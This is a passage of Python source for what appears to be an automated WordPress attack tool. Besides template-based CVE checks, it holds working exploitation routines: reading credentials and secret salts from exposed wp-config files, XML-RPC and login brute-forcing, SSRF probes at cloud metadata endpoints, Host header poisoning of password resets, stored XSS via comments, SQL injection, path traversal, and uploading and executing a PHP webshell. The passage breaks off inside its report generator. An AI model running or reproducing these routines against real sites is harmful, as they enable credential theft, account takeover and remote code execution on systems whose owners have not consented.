        if is_multipart:
            form   = aiohttp.FormData()
            fields = req_def.get("multipart_fields", {})
            for k, v in fields.items():
                form.add_field(k, v)
            mf = req_def.get("multipart_file")
            if mf:
                form.add_field(mf["field"], mf["content"],
                               filename=mf["filename"],
                               content_type=mf.get("content_type", "application/octet-stream"))
            async with session.post(url, data=form, headers={"User-Agent": rand_ua()},
                                    timeout=tmpl_timeout, allow_redirects=False) as r:
                text    = await r.text(errors="replace")
                elapsed = time.time() - start
                return text, r.status, dict(r.headers), elapsed

        elif method == "GET":
            async with session.get(url, headers=req_headers, timeout=tmpl_timeout,
                                   allow_redirects=False) as r:
                text    = await r.text(errors="replace")
                elapsed = time.time() - start
                return text, r.status, dict(r.headers), elapsed

        else:
            async with session.request(method, url, data=body_str, headers=req_headers,
                                       timeout=tmpl_timeout, allow_redirects=False) as r:
                text    = await r.text(errors="replace")
                elapsed = time.time() - start
                return text, r.status, dict(r.headers), elapsed

    except asyncio.TimeoutError:
        elapsed = time.time() - start
        return "", 408, {}, elapsed        # 408 = timeout; duration is still valid
    except Exception:
        return None, -1, {}, 0.0

async def _run_cve_template(session, base_url, tmpl_dict, plugin_url="", theme_url=""):
    """Run all requests in one template. Return (success, evidence, hit_url)."""
    for req_def in tmpl_dict.get("http", []):
        body, status, resp_headers, duration = await _execute_template_request(
            session, base_url, req_def, plugin_url, theme_url)

        matchers  = req_def.get("matchers", [])
        condition = req_def.get("matchers_condition", "and")
        success, evidence = evaluate_template_matchers(
            body, status, resp_headers, duration, matchers, condition)

        raw_path = req_def.get("path", "/")
        hit_url  = raw_path.replace("{{BaseURL}}", base_url.rstrip("/"))
        if hit_url.startswith("/"):
            hit_url = base_url.rstrip("/") + hit_url
        elif not hit_url.startswith("http"):
            hit_url = urljoin(base_url, hit_url)

        if success:
            return True, evidence, hit_url
    return False, "no matchers triggered", ""

# ── Template file I/O ─────────────────────────────────────────────────────────
def _load_template_files(templates_dir):
    """Load all .yaml/.yml/.json template files from disk."""
    templates = []
    if not os.path.isdir(templates_dir):
        return templates
    for fname in sorted(os.listdir(templates_dir)):
        fpath = os.path.join(templates_dir, fname)
        try:
            if (fname.endswith(".yaml") or fname.endswith(".yml")) and _YAML_OK:
                with open(fpath, encoding="utf-8") as f:
                    data = _yaml.safe_load(f)
                if isinstance(data, dict):
                    templates.append(data)
            elif fname.endswith(".json"):
                with open(fpath, encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, dict):
                    templates.append(data)
        except Exception as ex:
            warn(f"Template load error ({fname}): {ex}")
    return templates

def seed_template_dir(templates_dir):
    """
    Write all built-in templates to <templates_dir>/ as JSON files so users
    can inspect, edit, and add their own alongside them.  Idempotent — won't
    overwrite files the user has already edited.
    """
    os.makedirs(templates_dir, exist_ok=True)
    for tmpl in BUILTIN_TEMPLATES:
        tid   = tmpl.get("id", "unknown")
        slug  = tmpl.get("target", {}).get("slug", "core")
        fname = f"{tid}--{slug}.json"
        fpath = os.path.join(templates_dir, fname)
        if not os.path.exists(fpath):
            with open(fpath, "w", encoding="utf-8") as f:
                json.dump(tmpl, f, indent=2, ensure_ascii=False)
    return templates_dir

def _get_all_templates(templates_dir):
    """
    Merge built-in templates with any custom files in templates_dir.
    Disk files take precedence over built-ins with the same id.
    """
    seed_template_dir(templates_dir)
    by_id = {t["id"]: t for t in BUILTIN_TEMPLATES}
    for dt in _load_template_files(templates_dir):
        if "id" in dt:
            by_id[dt["id"]] = dt        # user override wins
    return list(by_id.values())

# ── Template runner ───────────────────────────────────────────────────────────
async def run_all_local_templates(session, result, templates_dir):
    """
    Match every loaded CVE template against the detected component inventory
    (plugins / themes / WP core), skip patched versions, test the rest.
    """
    all_templates = _get_all_templates(templates_dir)
    ok(f"CVE templates: {len(all_templates)} loaded from {templates_dir}")

    detected_plugins = {p.slug.lower(): p for p in result.plugins}
    detected_themes  = {t.slug.lower(): t for t in result.themes}
    wp_ver           = result.wp_version

    matched = []
    for tmpl in all_templates:
        tgt    = tmpl.get("target", {})
        ttype  = tgt.get("type", "plugin")
        slug   = tgt.get("slug", "").lower()
        fixed  = tgt.get("fixed_in", "")
        ttype  = ttype.lower()

        if ttype == "plugin":
            entry = detected_plugins.get(slug)
            if not entry:
                continue
            det_ver    = entry.version
            plugin_url = urljoin(result.target_url, f"wp-content/plugins/{entry.slug}")
            theme_url  = ""
        elif ttype == "theme":
            entry = detected_themes.get(slug)
            if not entry:
                continue
            det_ver   = entry.version
            theme_url = urljoin(result.target_url, f"wp-content/themes/{entry.slug}")
            plugin_url = ""
        elif ttype == "core":
            if not wp_ver:
                continue
            det_ver    = wp_ver
            slug       = "wordpress-core"
            plugin_url = ""
            theme_url  = ""
        else:
            continue

        # Skip if current version is already >= fixed_in (patched)
        if fixed and det_ver and not version_lt(det_ver, fixed):
            continue

        matched.append((tmpl, slug, det_ver, plugin_url, theme_url))

    if not matched:
        info(f"CVE templates: 0 applicable (no matching unpatched components detected)")
        return []

    warn(f"CVE templates: {len(matched)} applicable — executing...")

    sem = asyncio.Semaphore(4)

    async def test_one(tmpl, slug, det_ver, plugin_url, theme_url):
        async with sem:
            tid      = tmpl.get("id", "?")
            info_blk = tmpl.get("info", {})
            name     = info_blk.get("name", tid)
            severity = info_blk.get("severity", "medium").upper()
            cvss     = float(info_blk.get("cvss_score", 0.0))
            tags     = info_blk.get("tags", [])

            info(f"  [{tid}] {name[:65]}")
            success, evidence, hit_url = await _run_cve_template(
                session, result.target_url, tmpl, plugin_url, theme_url)

            if success:
                pwn(f"TEMPLATE HIT  {severity_tag(severity, cvss)} {tid}  {slug} v{det_ver or '?'}")
                pwn(f"  → {evidence}  @ {hit_url}")
                result.exploit_results.append(ExploitResult(
                    plugin_slug=slug, cve_id=tid,
                    exploit_type=f"template:{tags[0] if tags else 'check'}",
                    success=True,
                    evidence=f"{evidence} | {name[:80]}",
                    payload_used=hit_url,
                ))
            else:
                fail(f"{tid} — not vulnerable (or patched)")

            return {
                "id": tid, "name": name, "slug": slug,
                "version": det_ver, "severity": severity,
                "cvss_score": cvss, "success": success,
                "evidence": evidence, "url": hit_url,
                "tags": tags,
            }

    results = await asyncio.gather(
        *[test_one(*args) for args in matched],
        return_exceptions=True
    )
    tresults = [r for r in results if isinstance(r, dict)]
    hits     = [r for r in tresults if r["success"]]

    result.template_results = tresults
    ok(f"CVE templates: {len(hits)}/{len(tresults)} confirmed vulnerable")
    return tresults

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 — EXPLOITATION
# ─────────────────────────────────────────────────────────────────────────────
async def exploit_exposed_config(session, result):
    cfg_files = [f for f in result.sensitive_files if "wp-config" in f["path"] and f["status"]==200]
    for cfg in cfg_files:
        try:
            async with session.get(cfg["url"], headers=hdr(), timeout=15) as r:
                if r.status == 200:
                    text = await r.text(errors="replace")
                    extracted = {}
                    # DB credentials + table prefix
                    for const in ["DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST",
                                  "DB_CHARSET", "DB_COLLATE", "table_prefix"]:
                        m = re.search(
                            rf"define\s*\(\s*['\"]?{const}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                            text
                        )
                        if m:
                            extracted[const] = m.group(1)
                    # WordPress secret keys + salts — can forge authentication cookies
                    salt_keys = [
                        "AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY",
                        "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT",
                    ]
                    salts = {}
                    for sk in salt_keys:
                        m = re.search(
                            rf"define\s*\(\s*['\"]?{sk}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                            text
                        )
                        if m:
                            salts[sk] = m.group(1)
                    if salts:
                        extracted["__salts__"] = salts
                        warn(f"Config leak includes ALL {len(salts)} secret keys/salts — "
                             "cookie forgery / session hijack possible!")

                    if extracted:
                        result.exploit_results.append(ExploitResult(
                            plugin_slug="wp-config", cve_id="CONFIG_LEAK",
                            exploit_type="config_leak", success=True,
                            evidence=json.dumps({k: v for k, v in extracted.items()
                                                 if k != "__salts__"}),
                            payload_used=cfg["url"]
                        ))
                        return extracted
        except Exception:
            pass
    return {}

_LOCKOUT_SIGNALS = [
    "too many", "too many failed", "account locked", "locked out",
    "temporarily blocked", "limit reached", "rate limit", "login limit",
    "security lockout", "brute force", "wplogin locked", "sign-in was blocked",
    "error: too many", "blocked",
]

def _is_lockout(text: str) -> bool:
    tl = text.lower()
    return any(sig in tl for sig in _LOCKOUT_SIGNALS)

async def exploit_xmlrpc_bruteforce(session, result, passwords):
    if not (result.xmlrpc_accessible and result.xmlrpc_multicall and result.users):
        return []
    url   = urljoin(result.target_url, "xmlrpc.php")
    found = []
    BATCH = 100
    for u in result.users:
        chunks = [passwords[i:i+BATCH] for i in range(0, len(passwords), BATCH)]
        locked = False
        for chunk in chunks:
            if locked:
                break
            calls = "".join(
                f"<value><struct>"
                f"<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
                f"<member><name>params</name><value><array><data>"
                f"<value><string>{u.slug}</string></value><value><string>{pwd}</string></value>"
                f"</data></array></value></member></struct></value>"
                for pwd in chunk
            )
            xml = (f'<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                   f'<params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>')
            try:
                async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=30) as r:
                    if r.status == 200:
                        text = await r.text(errors="replace")
                        if _is_lockout(text):
                            warn(f"XML-RPC brute: account lockout detected for {u.slug} — stopping")
                            locked = True
                            break
                        parts = re.findall(r'<value>(.*?)</value>', text, re.S)
                        for i, part in enumerate(parts):
                            if i < len(chunk) and "faultCode" not in part and "<struct>" in part:
                                pwd = chunk[i]
                                found.append({"user": u.slug, "pass": pwd})
                                u.password = pwd
                                result.exploit_results.append(ExploitResult(
                                    plugin_slug="xmlrpc", cve_id="BRUTE_FORCE",
                                    exploit_type="credential_brute", success=True,
                                    evidence=f"{u.slug}:{pwd}", payload_used="XML-RPC multicall"
                                ))
                                break
            except Exception:
                pass
            await asyncio.sleep(0.2)
            if found:
                break
    return found

async def exploit_wplogin_bruteforce(session, result, passwords, delay=0.5):
    found = []
    url   = urljoin(result.target_url, "wp-login.php")
    for u in result.users:
        locked = False
        for pwd in passwords:
            if locked:
                break
            try:
                post_data = {"log": u.slug, "pwd": pwd, "wp-submit": "Log In",
                             "redirect_to": "/wp-admin/", "testcookie": "1"}
                async with session.post(url, data=post_data,
                    headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
                    timeout=12, allow_redirects=False) as r:
                    loc  = r.headers.get("Location", "")
                    text = ""
                    if r.status == 200:
                        text = await r.text(errors="replace")
                    if _is_lockout(text) or (r.status == 429):
                        warn(f"wp-login brute: lockout/rate-limit detected for {u.slug} — stopping")
                        locked = True
                        break
                    if r.status in (301, 302) and "wp-admin" in loc:
                        found.append({"user": u.slug, "pass": pwd})
                        u.password = pwd
                        result.exploit_results.append(ExploitResult(
                            plugin_slug="wp-login", cve_id="BRUTE_FORCE",
                            exploit_type="credential_brute", success=True,
                            evidence=f"{u.slug}:{pwd}", payload_used="wp-login.php POST"
                        ))
                        break
            except Exception:
                pass
            await asyncio.sleep(delay)
    return found

async def exploit_ssrf_pingback(session, result):
    """SSRF via XML-RPC wordpress.pingback.ping."""
    if not result.xmlrpc_accessible:
        return ExploitResult("xmlrpc","SSRF","ssrf_pingback",False,"XML-RPC not accessible","")

    url = urljoin(result.target_url, "xmlrpc.php")
    internal_targets = [
        "http://127.0.0.1/",
        # AWS IMDSv1 — no auth required, leaks IAM role + temporary creds
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        # GCP metadata service — requires Metadata-Flavor: Google but worth trying
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        # Azure IMDS — requires Metadata: true header, probe anyway
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.170.2/v2/metadata",
        # Internal RFC1918 gateway probes
        "http://10.0.0.1/",
        "http://192.168.1.1/",
    ]
    for target in internal_targets:
        xml = (f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
               f'<params><param><value><string>{target}</string></value></param>'
               f'<param><value><string>{result.target_url}</string></value></param>'
               f'</params></methodCall>')
        try:
            async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=15) as r:
                text = await r.text(errors="replace")
                # SSRF confirmed if we get anything other than "invalid discovery URL"
                if r.status == 200 and "faultCode" not in text:
                    xr = ExploitResult("xmlrpc","SSRF","ssrf_pingback",True,
                                       f"SSRF probe accepted for target: {target}", xml)
                    result.exploit_results.append(xr)
                    return xr
                # 0x0011 = server not found = still proves request was made to target
                if "0x0011" not in text and "Invalid" not in text:
                    xr = ExploitResult("xmlrpc","SSRF","ssrf_pingback",True,
                                       f"SSRF likely: unexpected response for {target}: {text[:80]}", xml)
                    result.exploit_results.append(xr)
                    return xr
        except Exception:
            pass

    return ExploitResult("xmlrpc","SSRF","ssrf_pingback",False,
                         "SSRF probe rejected by server","pingback.ping")

async def exploit_host_header_injection(session, result):
    """Host header injection via password reset endpoint."""
    attacker_domain = "attacker.wphawk.evil"
    url = urljoin(result.target_url, "wp-login.php?action=lostpassword")

    user_login = result.users[0].slug if result.users else "admin"
    data = {"user_login": user_login, "wp-submit": "Get New Password",
            "redirect_to": "", "action": "lostpassword"}
    try:
        async with session.post(url, data=data,
            headers={**hdr(), "Host": attacker_domain, "Content-Type": "application/x-www-form-urlencoded"},
            timeout=12, allow_redirects=False) as r:
            text = await r.text(errors="replace")
            # Successful password reset email trigger, or error about email
            if r.status in (200,302) and ("email" in text.lower() or "sent" in text.lower()):
                xr = ExploitResult(
                    "wp-login", "HOST_HEADER_INJECT", "host_header_injection", True,
                    f"Password reset request accepted with Host: {attacker_domain} — email may contain poisoned link",
                    f"POST wp-login.php?action=lostpassword with Host: {attacker_domain}"
                )
                result.exploit_results.append(xr)
                return xr
    except Exception:
        pass
    return ExploitResult("wp-login","HOST_HEADER_INJECT","host_header_injection",False,
                         "Host header injection: no confirmation of poisoned reset email","")

async def exploit_stored_xss(session, result, html):
    """Probe comment forms on posts for Stored XSS."""
    marker     = f"wphawk_xss_{WEBSHELL_MARKER[:8]}"
    xss_payload = f'<script>/*{marker}*/</script>'

    # Find a post URL from homepage links or sitemap
    post_urls = re.findall(r'href=["\'](' + re.escape(result.target_url) + r'[^"\'?#]+/?)["\']', html)
    candidate = next((u for u in post_urls if u != result.target_url), None)
    if not candidate and result.sitemap_urls:
        candidate = result.sitemap_urls[0]
    if not candidate:
        return ExploitResult("comments","XSS","stored_xss",False,"No post URL found to test","")

    # Fetch the post to get comment_post_ID
    try:
        async with session.get(candidate, headers=hdr(), timeout=12) as r:
            post_html = await r.text(errors="replace")
        post_id_m = re.search(r'comment_post_ID["\'][^>]*value=["\'](\d+)["\']', post_html)
        if not post_id_m:
            return ExploitResult("comments","XSS","stored_xss",False,"No comment form found","")

        post_id = post_id_m.group(1)
        comment_data = {
            "comment_post_ID": post_id,
            "author": "WPHawk Test",
            "email": "test@wphawk.local",
            "url": "",
            "comment": xss_payload,
            "submit": "Post Comment",
        }
        comment_url = urljoin(result.target_url, "wp-comments-post.php")
        async with session.post(comment_url, data=comment_data,
            headers=hdr({"Content-Type":"application/x-www-form-urlencoded", "Referer": candidate}),
            timeout=12, allow_redirects=True) as r:
            text = await r.text(errors="replace")
            if marker in text or xss_payload in text:
                xr = ExploitResult("comments","XSS","stored_xss",True,
                                   f"XSS payload stored unfiltered on: {candidate}",xss_payload)
                result.exploit_results.append(xr)
                return xr
    except Exception:
        pass
    return ExploitResult("comments","XSS","stored_xss",False,
                         "XSS payload was sanitized or comment rejected","")

async def authenticated_scan(session, result):
    """After credential discovery, re-scan wp-admin with auth for deeper findings."""
    creds = [(u.slug, u.password) for u in result.users if u.password]
    if not creds:
        info("Auth scan: no credentials found, skipping")
        return

    username, password = creds[0]
    info(f"Authenticated scan as: {username}")
    login_url = urljoin(result.target_url, "wp-login.php")

    # Login and capture session cookie
    try:
        data = {"log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": "/wp-admin/", "testcookie": "1"}
        async with session.post(login_url, data=data,
            headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
            timeout=15, allow_redirects=True) as r:
            auth_html = await r.text(errors="replace")

            if "wp-admin" not in str(r.url) and "Dashboard" not in auth_html:
                info("Auth scan: login failed")
                return

            ok(f"Authenticated as {username} — probing wp-admin...")

            # Probe admin areas
            admin_probes = {
                "User list":       "wp-admin/users.php",
                "Plugin manager":  "wp-admin/plugins.php",
                "Theme editor":    "wp-admin/theme-editor.php",
                "Plugin editor":   "wp-admin/plugin-editor.php",
                "Export":          "wp-admin/export.php",
                "Options":         "wp-admin/options.php",
                "File manager":    "wp-admin/admin.php?page=wp-file-manager",
            }
            auth_findings = []
            for label, path in admin_probes.items():
                url = urljoin(result.target_url, path)
                try:
                    async with session.get(url, headers=hdr(), timeout=10) as rr:
                        if rr.status == 200:
                            auth_findings.append(f"{label}: accessible ({url})")
                            # Theme/Plugin editor = RCE possible
                            if "editor" in path:
                                result.exploit_results.append(ExploitResult(
                                    plugin_slug="wp-admin", cve_id="AUTH_RCE",
                                    exploit_type="auth_rce_via_editor",
                                    success=True,
                                    evidence=f"Code editor accessible at {url} — authenticated RCE possible",
                                    payload_used=f"GET {url}"
                                ))
                except Exception:
                    pass

            if auth_findings:
                ok(f"Auth scan findings: {len(auth_findings)}")
                for f in auth_findings:
                    ok(f"  → {f}")
                    result.exploit_results.append(ExploitResult(
                        plugin_slug="wp-admin", cve_id="AUTH_ACCESS",
                        exploit_type="authenticated_access",
                        success=True, evidence=f, payload_used=f"GET {f.split('(')[-1].rstrip(')')}"
                    ))
    except Exception as ex:
        info(f"Auth scan error: {ex}")

async def _exploit_sqli(session, base_url, plugin, cve):
    params   = ["id","post_id","page_id","cat","tag","order","orderby","tab","action","filter","q","s","type","view"]
    payload  = "' AND SLEEP(5)-- -"
    endpoint = urljoin(base_url, "wp-admin/admin-ajax.php")
    for param in params:
        url = f"{endpoint}?{param}={payload}"
        try:
            start = time.time()
            async with session.get(url, headers=hdr(), timeout=12) as r:
                if time.time() - start >= 4.5:
                    xr = ExploitResult(plugin.slug, cve.cve_id, "sqli", True,
                                       f"Time-based SQLi: param '{param}' at admin-ajax.php", url)
                    return xr
        except asyncio.TimeoutError:
            return ExploitResult(plugin.slug, cve.cve_id, "sqli", True,
                                 f"SQLi confirmed via timeout: param '{param}'", url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "sqli", False, "No SQLi evidence", payload)

async def _exploit_lfi(session, base_url, plugin, cve):
    payloads = ["../../../../wp-config.php","../../../../etc/passwd","../../../wp-config.php"]
    params   = ["file","path","template","page","include","load","view","f","p"]
    for param in params:
        for payload in payloads:
            try:
                url = f"{base_url}?{param}={payload}"
                async with session.get(url, headers=hdr(), timeout=12) as r:
                    if r.status == 200:
                        t = await r.text(errors="replace")
                        if "DB_PASSWORD" in t or "root:" in t or "define(" in t:
                            return ExploitResult(plugin.slug, cve.cve_id, "lfi", True,
                                                 f"LFI: param '{param}', file content exposed", url)
            except Exception:
                pass
    return ExploitResult(plugin.slug, cve.cve_id, "lfi", False, "LFI probes returned nothing sensitive", "traversal")

async def _exploit_file_upload(session, base_url, plugin, cve):
    name    = f"{hashlib.md5(plugin.slug.encode()).hexdigest()[:8]}.php"
    content = f'<?php if(isset($_GET["c"])){{echo md5("{WEBSHELL_MARKER}");system($_GET["c"]);}} ?>'
    eps     = [urljoin(base_url, "wp-admin/admin-ajax.php"),
               urljoin(base_url, f"wp-content/plugins/{plugin.slug}/upload.php")]
    for ep in eps:
        try:
            form = aiohttp.FormData()
            form.add_field("file", content, filename=name, content_type="application/octet-stream")
            form.add_field("action","upload")
            async with session.post(ep, data=form, headers={"User-Agent": rand_ua()}, timeout=20) as r:
                if r.status in (200,201):
                    text = await r.text(errors="replace")
                    urls = re.findall(r'https?://[^\s"\'<>]+\.php', text)
                    shell_url = next((u for u in urls if "uploads" in u), None)
                    if shell_url:
                        async with session.get(f"{shell_url}?c=echo+{WEBSHELL_MARKER}", headers=hdr(), timeout=10) as vr:
                            if WEBSHELL_MARKER in await vr.text(errors="replace"):
                                return ExploitResult(plugin.slug, cve.cve_id, "file_upload_rce", True,
                                                     f"Webshell deployed: {shell_url}", shell_url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "file_upload_rce", False, "Upload failed", name)

async def _exploit_auth_bypass(session, base_url, plugin, cve):
    paths = [
        f"wp-admin/admin-ajax.php?action={plugin.slug.replace('-','_')}_admin",
        f"wp-json/{plugin.slug}/v1/settings",
    ]
    for path in paths:
        url = urljoin(base_url, path)
        try:
            async with session.get(url, headers=hdr(), timeout=12) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    if any(kw in t for kw in ["admin","settings","password","email","config"]):
                        return ExploitResult(plugin.slug, cve.cve_id, "auth_bypass", True,
                                             f"Admin data without auth: {url}", url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "auth_bypass", False, "No admin data leaked", "admin-ajax")

async def _exploit_rce(session, base_url, plugin, cve):
    marker   = WEBSHELL_MARKER
    payloads = [f"{{{{system('echo {marker}')}}}}", f"<?php echo md5('{marker}'); ?>"]
    params   = ["template","code","cmd","exec","eval","payload","data","input"]
    for param in params:
        for pl in payloads:
            try:
                url = f"{base_url}?{param}={pl}"
                async with session.get(url, headers=hdr(), timeout=12) as r:
                    if marker in await r.text(errors="replace"):
                        return ExploitResult(plugin.slug, cve.cve_id, "rce", True,
                                             f"RCE via param '{param}'", url)
            except Exception:
                pass
    return ExploitResult(plugin.slug, cve.cve_id, "rce", False, "RCE probes no execution evidence", "eval payloads")

async def exploit_plugin_cve(session, result, plugin, cve):
    desc = (cve.description or "").lower()
    if any(kw in desc for kw in ["file upload","arbitrary file","unrestricted upload"]):
        return await _exploit_file_upload(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["sql injection","sqli"]):
        return await _exploit_sqli(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["local file","path traversal","file inclusion","lfi"]):
        return await _exploit_lfi(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["remote code","code execution","rce","command injection"]):
        return await _exploit_rce(session, result.target_url, plugin, cve)
    return await _exploit_auth_bypass(session, result.target_url, plugin, cve)

async def run_all_exploits(session, result, args, html=""):
    warn("Exploitation phase starting...")

    cfg = await exploit_exposed_config(session, result)
    if cfg:
        pwn(f"Config leak — {', '.join(cfg.keys())}")
    else:
        fail("No exposed config files")

    if args.brute and result.xmlrpc_accessible:
        passwords = load_wordlist(args.passwords) or BUILTIN_PASSWORDS
        info(f"XML-RPC multicall brute ({len(passwords)} passwords)...")
        creds = await exploit_xmlrpc_bruteforce(session, result, passwords)
        for c in creds:
            pwn(f"XML-RPC: {c['user']}:{c['pass']}")
        if not creds:
            fail("XML-RPC brute: no valid credentials")

    if args.brute_login:
        passwords = load_wordlist(args.passwords) or BUILTIN_PASSWORDS
        info(f"wp-login.php brute ({len(passwords)} passwords, 0.5s delay)...")
        creds = await exploit_wplogin_bruteforce(session, result, passwords, 0.5)
        for c in creds:
            pwn(f"Login: {c['user']}:{c['pass']}")
        if not creds:
            fail("wp-login brute: no valid credentials")

    # New: SSRF, Host Header, XSS
    info("SSRF via XML-RPC pingback...")
    ssrf = await exploit_ssrf_pingback(session, result)
    if ssrf.success:
        pwn(f"SSRF: {ssrf.evidence}")
    else:
        fail(f"SSRF: {ssrf.evidence}")

    info("Host header injection (password reset)...")
    hhi = await exploit_host_header_injection(session, result)
    if hhi.success:
        pwn(f"Host header injection: {hhi.evidence}")
    else:
        fail("Host header injection: request rejected")

    info("Stored XSS via comment form...")
    xss = await exploit_stored_xss(session, result, html)
    if xss.success:
        pwn(f"Stored XSS: {xss.evidence}")
    else:
        fail("XSS: payload was sanitized")

    # Plugin CVE exploits — use vulnerable_cves (version-filtered) only
    candidates = [
        (p, cve) for p in result.plugins + result.themes
        for cve in p.vulnerable_cves
        if cve.cvss_score >= 7.0 or cve.exploit_available
    ]
    if candidates:
        info(f"Attempting {len(candidates)} CVE exploit(s) on unpatched findings...")
        for plugin, cve in candidates:
            xr = await exploit_plugin_cve(session, result, plugin, cve)
            if xr:
                result.exploit_results.append(xr)
                if xr.success:
                    pwn(f"{plugin.slug} [{cve.cve_id}] {xr.exploit_type}: {xr.evidence[:80]}")
                    plugin.exploited = True
                else:
                    fail(f"{plugin.slug} [{cve.cve_id}] {xr.exploit_type}")

    # Authenticated scan
    if args.auth_scan:
        await authenticated_scan(session, result)

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 — REPORTING
# ─────────────────────────────────────────────────────────────────────────────
def _html_esc(s):
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")

def generate_html_report(result, html_path):
    """
    Self-contained dark-theme HTML report.  No external dependencies — single file,
    open in any browser.  Includes severity badges, collapsible sections, plugin table,
    CVE table, upload findings, and an executive summary strip.
    """
    host = urlparse(result.target_url).netloc
    os.makedirs("output", exist_ok=True)

    sev_colors = {"CRITICAL":"#dc2626","HIGH":"#ea580c","MEDIUM":"#d97706","LOW":"#16a34a"}
    def badge(sev, score=""):
        c = sev_colors.get(sev.upper(), "#6b7280")
        return f'<span class="badge" style="background:{c}">{_html_esc(sev)}{(" "+str(score)) if score else ""}</span>'

    # ── stats ─────────────────────────────────────────────────────────────────
    total_plugins = len(result.plugins)
    total_themes  = len(result.themes)
    total_vulns   = sum(len(p.vulnerable_cves) for p in result.plugins + result.themes)
    crit_vulns    = sum(1 for p in result.plugins + result.themes
                        for c in p.vulnerable_cves if c.cvss_score >= 9.0)
    exposed_files = len([f for f in result.sensitive_files if f["status"] == 200])
    exploit_hits  = len([x for x in result.exploit_results if x.success])
    sensitive_up  = len([f for f in result.upload_findings
                         if f["type"] in ("sensitive_upload_file","listed_sensitive_file")])

    risk_level = "CRITICAL" if crit_vulns else ("HIGH" if total_vulns else
                  ("MEDIUM" if exposed_files else "LOW"))
    risk_color = sev_colors.get(risk_level, "#16a34a")

    # ── plugin table rows ─────────────────────────────────────────────────────
    plugin_rows = ""
    for p in sorted(result.plugins + result.themes,
                    key=lambda x: len(x.vulnerable_cves), reverse=True):
        cve_cell = ""
        if p.vulnerable_cves:
            top = p.vulnerable_cves[0]
            cve_cell = badge(top.severity, top.cvss_score) + f" {_html_esc(top.cve_id)}"
            if len(p.vulnerable_cves) > 1:
                cve_cell += f' <span class="dim">+{len(p.vulnerable_cves)-1} more</span>'
        else:
            cve_cell = '<span style="color:#16a34a">✓ clean</span>'
        vsrc  = f'<span class="dim">[{_html_esc(p.version_source)}]</span>' if p.version_source else ""
        latest = f' → <span style="color:#22c55e">{_html_esc(p.latest_version)}</span>' if p.is_outdated else ""
        plugin_rows += (
            f"<tr><td><code>{_html_esc(p.slug)}</code></td>"
            f"<td>{_html_esc(p.asset_type)}</td>"
            f"<td>{_html_esc(p.version or '?')}{latest} {vsrc}</td>"
            f"<td>{_html_esc(p.detected_by)}</td>"
            f"<td>{cve_cell}</td></tr>\n"
        )

    # ── user rows ────────────────────────────────────────────────────────────
    user_rows = "".join(
        f"<tr><td>{_html_esc(u.slug)}</td><td>{u.id}</td>"
        f"<td>{_html_esc(u.detected_by)}</td>"
        f"<td>{'<span style=\"color:#dc2626\">'+_html_esc(u.password)+'</span>' if u.password else ''}</td></tr>\n"
        for u in result.users
    )

    # ── upload finding rows ───────────────────────────────────────────────────
    upload_rows = ""
    for f in result.upload_findings[:50]:
        typ  = f.get("type","")
        icon = "📂" if "dir_listing" in typ else "⚠️"
        upload_rows += (
            f"<tr><td>{icon}</td>"
            f"<td><a href=\"{_html_esc(f.get('url',''))}\" target=\"_blank\">"
            f"{_html_esc(f.get('path', f.get('url','?')))}</a></td>"
            f"<td>{_html_esc(f.get('description',''))}</td>"
            f"<td>{_html_esc(f.get('size','?'))}</td></tr>\n"
        )

    # ── sensitive file rows ───────────────────────────────────────────────────
    sf_rows = "".join(
        f"<tr><td><a href=\"{_html_esc(f['url'])}\" target=\"_blank\">"
        f"{_html_esc(f['path'])}</a></td>"
        f"<td>{'<span style=\"color:#dc2626\">EXPOSED</span>' if f['status']==200 else '<span style=\"color:#d97706\">MAY EXIST (403)</span>'}</td></tr>\n"
        for f in result.sensitive_files
    )

    # ── template results ──────────────────────────────────────────────────────
    tmpl_rows = ""
    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
    for t in sorted(result.template_results,
                    key=lambda x:(0 if x["success"] else 1,
                                  sev_order.get(x["severity"],9), -x["cvss_score"])):
        icon = "✅" if t["success"] else "⬜"
        tmpl_rows += (
            f"<tr><td>{icon}</td><td>{badge(t['severity'],t['cvss_score'])}</td>"
            f"<td><code>{_html_esc(t['id'])}</code></td>"
            f"<td>{_html_esc(t['slug'])}</td>"
            f"<td class='dim'>{_html_esc(t['name'][:80])}</td>"
            f"<td>{'<span style=\"color:#22c55e\">'+_html_esc(t.get('evidence',''))[:80]+'</span>' if t['success'] else ''}</td></tr>\n"
        )

    # ── exploit rows ─────────────────────────────────────────────────────────
    expl_rows = "".join(
        f"<tr><td>{'✅' if x.success else '⬜'}</td>"
        f"<td><code>{_html_esc(x.plugin_slug)}</code></td>"
        f"<td><code>{_html_esc(x.cve_id)}</code></td>"
        f"<td>{_html_esc(x.exploit_type)}</td>"
        f"<td class='dim'>{_html_esc(x.evidence[:100])}</td></tr>\n"
